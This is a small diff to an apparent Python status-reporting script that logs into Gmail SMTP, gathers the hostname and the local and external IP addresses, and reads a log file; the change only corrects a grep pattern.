@@ -19,8 +19,8 @@ smtpserver.ehlo
 smtpserver.login(gmail_user, gmail_password)
 today = datetime.date.today()
 hostname = (socket.gethostname())
-ethip = os.popen('ifconfig eth0 | grep \' inet\' | cut -d \' \' -f10').read().strip()
-wlanip = os.popen('ifconfig wlan0 | grep \' inet\' | cut -d \' \' -f10').read().strip()
+ethip = os.popen('ifconfig eth0 | grep \' inet \' | cut -d \' \' -f10').read().strip()
+wlanip = os.popen('ifconfig wlan0 | grep \' inet \' | cut -d \' \' -f10').read().strip()
 extip = os.popen('curl -s icanhazip.com').read().strip()
 with open('caplog.txt', 'r') as myfile:
     logs=myfile.read()
